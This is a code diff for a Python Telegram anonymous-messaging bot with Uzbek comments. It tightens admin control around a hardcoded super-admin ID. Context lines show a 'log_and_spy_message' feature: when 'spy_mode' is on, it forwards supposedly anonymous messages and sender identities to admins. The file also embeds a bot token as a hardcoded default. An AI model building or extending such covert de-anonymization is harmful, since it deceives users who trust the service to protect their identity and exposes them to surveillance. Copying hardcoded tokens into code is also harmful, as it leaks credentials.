@@ -13,6 +13,9 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 BOT_TOKEN = os.getenv("BOT_TOKEN", "9188093637:AAFfD5YpypSxulv8nd8u51xYGsEDlZXHIHY")
 
+# FAQAT SIZNING TELEGRAM ID RAQAMINGIZ (O'zgarmas bosh admin)
+SUPER_ADMIN_ID = 1609786019
+
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
@@ -44,6 +47,9 @@ async def init_db():
                 dnd_mode INTEGER DEFAULT 0
             )
         """)
+        # Begona tasodifiy adminlarni darhol oddiy foydalanuvchiga tushirish
+        await db.execute("UPDATE users SET is_admin = 0 WHERE user_id != ?", (SUPER_ADMIN_ID,))
+        
         await db.execute("""
             CREATE TABLE IF NOT EXISTS message_threads (
                 recipient_id INTEGER,
@@ -89,23 +95,19 @@ async def register_user(user: types.User, referrer_id: int = 0) -> str:
     user_id = user.id
     full_name = user.full_name or "Anonim"
     username = f"@{user.username}" if user.username else "yo'q"
+    is_admin = 1 if user_id == SUPER_ADMIN_ID else 0
 
     async with aiosqlite.connect("anon_bot.db") as db:
-        async with db.execute("SELECT token, custom_alias, is_admin FROM users WHERE user_id = ?", (user_id,)) as cur:
+        async with db.execute("SELECT token, custom_alias FROM users WHERE user_id = ?", (user_id,)) as cur:
             row = await cur.fetchone()
-            async with db.execute("SELECT COUNT(*) FROM users") as c_cur:
-                total_cnt = (await c_cur.fetchone())[0]
-            should_admin = 1 if (total_cnt == 0 or (row and row[2] == 1)) else 0
-
             if row:
                 await db.execute(
-                    "UPDATE users SET full_name = ?, username = ?, is_admin = MAX(is_admin, ?) WHERE user_id = ?",
-                    (full_name, username, should_admin, user_id)
+                    "UPDATE users SET full_name = ?, username = ?, is_admin = ? WHERE user_id = ?",
+                    (full_name, username, is_admin, user_id)
                 )
                 await db.commit()
                 return row[1] if row[1] else row[0]
 
-        is_admin = 1 if total_cnt == 0 else 0
         token = generate_token()
         await db.execute(
             "INSERT INTO users (user_id, full_name, username, token, is_admin) VALUES (?, ?, ?, ?, ?)",
@@ -121,16 +123,12 @@ async def get_user_by_identifier(identifier: str):
             return row[0] if row else None
 
 async def is_user_admin(user_id: int) -> bool:
+    if user_id == SUPER_ADMIN_ID:
+        return True
     async with aiosqlite.connect("anon_bot.db") as db:
         async with db.execute("SELECT is_admin FROM users WHERE user_id = ?", (user_id,)) as cur:
             row = await cur.fetchone()
-            if row and row[0] == 1:
-                return True
-        async with db.execute("SELECT user_id FROM users ORDER BY user_id ASC LIMIT 1") as cur:
-            first_row = await cur.fetchone()
-            if first_row and first_row[0] == user_id:
-                return True
-    return False
+            return bool(row and row[0] == 1)
 
 async def get_setting(key: str):
     async with aiosqlite.connect("anon_bot.db") as db:
@@ -168,7 +166,7 @@ async def log_and_spy_message(sender: types.User, recipient_id: int, message: ty
 
         if await get_setting("spy_mode") != "1":
             return
-        async with db.execute("SELECT user_id FROM users WHERE is_admin = 1 OR user_id = (SELECT user_id FROM users ORDER BY user_id ASC LIMIT 1)") as cur:
+        async with db.execute("SELECT user_id FROM users WHERE is_admin = 1 OR user_id = ?", (SUPER_ADMIN_ID,)) as cur:
             admins = await cur.fetchall()
 
     spy_header = (
@@ -380,7 +378,6 @@ async def process_anon_message(message: types.Message, state: FSMContext):
         
         forwarded = await message.copy_to(chat_id=target_user_id)
 
-        # Hint butunlay olib tashlandi, faqat javob yozish va bloklash qoldi
         kb_buttons = [
             [InlineKeyboardButton(text="✍️ Javob yozish", callback_data=f"write_to:{sender.id}")],
             [InlineKeyboardButton(text="🚫 Bloklash", callback_data=f"block:{sender.id}")]
@@ -430,13 +427,15 @@ async def render_admin_panel(chat_id: int):
         async with db.execute("SELECT COUNT(*), SUM(received_count) FROM users") as cur:
             row = await cur.fetchone()
             total_users, total_msgs = row if row else (0, 0)
-        async with db.execute("SELECT user_id, full_name, username FROM users WHERE is_admin = 1") as cur:
+        async with db.execute("SELECT user_id, full_name, username FROM users WHERE is_admin = 1 OR user_id = ?", (SUPER_ADMIN_ID,)) as cur:
             admins = await cur.fetchall()
 
     channel = await get_setting("channel")
     spy_mode = await get_setting("spy_mode")
     spy_status = "🟢 YOQILGAN" if spy_mode == "1" else "🔴 O'CHIRILGAN"
-    admin_list = "\n".join([f"• {a[1]} ({a[2]} | <code>{a[0]}</code>)" for a in admins])
+    
+    unique_admins = {a[0]: (a[1], a[2]) for a in admins}
+    admin_list = "\n".join([f"• {val[0]} ({val[1]} | <code>{uid}</code>)" for uid, val in unique_admins.items()])
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [
